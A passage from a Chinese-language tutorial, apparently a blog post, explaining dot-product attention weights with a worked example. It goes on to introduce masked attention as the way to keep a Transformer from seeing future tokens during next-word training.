<p>其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub><mo>+</mo><msub><mi>q</mi><mn>2</mn></msub><mo>+</mo><msub><mi>q</mi><mn>3</mn></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">q_1 + q_2 + q_3 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>；<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">q_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 表示 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 对当前输出 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的重要性权重，也就是<strong>注意力得分</strong>。那么现在问题转化为：如何合理地计算这些权重？</p>
<p>在这里我们要回顾一下线性代数中的向量点积运算，比如向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">3</span><span class="mclose">)</span></span></span></span></span>和向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-2,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">−</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>进行点积运算，它们的计算结果就是<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>×</mo><mo stretchy="false">(</mo><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mn>3</mn><mo>×</mo><mn>1</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \times (-2) + 3 \times 1 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">−</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>，计算结果是一个标量，其实就是逐元素相乘后在加起来。那么向量点积的数学意义是什么呢？点积的结果是一个标量，它在几何上反映了两个向量在方向上的对齐程度：方向越接近，值越大；方向越接近正交，值越接近零；方向相反则为负值。因此，<strong>点积可以自然地作为两个向量相似性的一种度量</strong>。</p>
<p>那么，计算注意力权重的思路就清晰了：我们可以用 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 与序列中每个向量（包括自身）的点积，来初步衡量它们之间的相似度：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>⋅</mo><msub><mi>x</mi><mn>1</mn></msub><mo>=</mo><mn>3.41</mn><mspace linebreak="newline"/><msub><mi>p</mi><mn>2</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>⋅</mo><msub><mi>x</mi><mn>2</mn></msub><mo>=</mo><mn>0.19</mn><mspace linebreak="newline"/><msub><mi>p</mi><mn>3</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>⋅</mo><msub><mi>x</mi><mn>3</mn></msub><mo>=</mo><mn>2.04</mn><mspace linebreak="newline"/><mi>q</mi><mo>=</mo><mtext>softmax</mtext><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_{1} = x_{1} \cdot x_{1} = 3.41
\\ p_{2} = x_{1} \cdot x_{2} = 0.19
\\ p_{3} = x_{1} \cdot x_{3} = 2.04
\\ q = \text{softmax}(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">3.41</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.19</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2.04</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">softmax</span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></div>
<p>最终，我们便得到了用于加权求和的注意力权重 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span>。这个过程直观上就是：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的生成，是基于“<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 与序列中每个元素相似度”所决定的注意力分配。 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的生成过程完全同理，只是分别以 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 作为查询的中心。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee96cecb211f46bdb9ff8042626f44c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=7jh7bLBUkPUVo1ejsQgrsBSCMuE%3D" alt="c6.jpg" width="100%" loading="lazy"/></p>
<p>最后，我们再回过头看到那个输出矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>，其中的每一个向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 都是序列信息融合后的结果，它代表了一种以自身为视角、对整个序列的注意力聚焦。</p>
<p>以上我们讲解了标准的注意力计算过程，它让序列中的每个词都能“看到”整个序列的所有信息。然而，这种“全知视角”在<strong>序列生成任务</strong>（如对话、文本创作）中却会带来一个根本性问题——信息泄漏。</p>
<p>一部精彩的悬疑电影之所以吸引人，在于观众和主角一样，对未来的剧情一无所知，只能根据已呈现的线索进行推测和期待。如果观众提前知道了凶手是谁（即获得了“未来信息”），那么整个观影的推理过程和悬念就荡然无存。Transformer 在生成文本时也是如此：它应该像一个“实时编剧”，只能基于<strong>已经写出的剧情</strong>来构思下一句话。</p>
<p>从技术视角看，问题具体何在？我们以训练一个极简版 ChatGPT 来生成 “I Love Apple” 这句话为例。在训练时，我们会将完整的句子输入模型，并让模型学习预测下一个词：</p>
<ul>
<li>当模型看到 <code>“I”</code> 时，它应该学习预测 <code>“Love”</code>。</li>
<li>当模型看到 <code>“I Love”</code> 时，它应该学习预测 <code>“Apple”</code>。</li>
</ul>
<p>关键在于，在标准注意力下，计算 <code>“Love”</code> 这个词的表示 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，它会与包括 <code>“Apple”</code> (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>) 在内的所有词计算注意力。这意味着，<strong>模型在训练预测 <code>“Love”</code> 的下一个词时，已经“偷看”到了答案 <code>“Apple”</code></strong>。这就像考试时直接把标准答案放在考卷上，模型无需费力“思考”和“推理”，只需简单地将注意力高度集中在下一个词上即可。这种数据泄漏会导致模型无法学会真正的语言建模能力。</p>
<p>那么，如何为模型戴上“眼罩”，屏蔽未来的信息呢？解决方案就是 <strong>掩码注意力（Masked Attention）</strong>。</p>
<p>其核心思想非常直观：<strong>在计算某个位置的输出时，只允许它关注该位置之前（包括自身）的所有位置</strong>。具体来说：</p>
<ul>
<li>计算  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (对应 <code>“I”</code>) 时，只允许关注 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
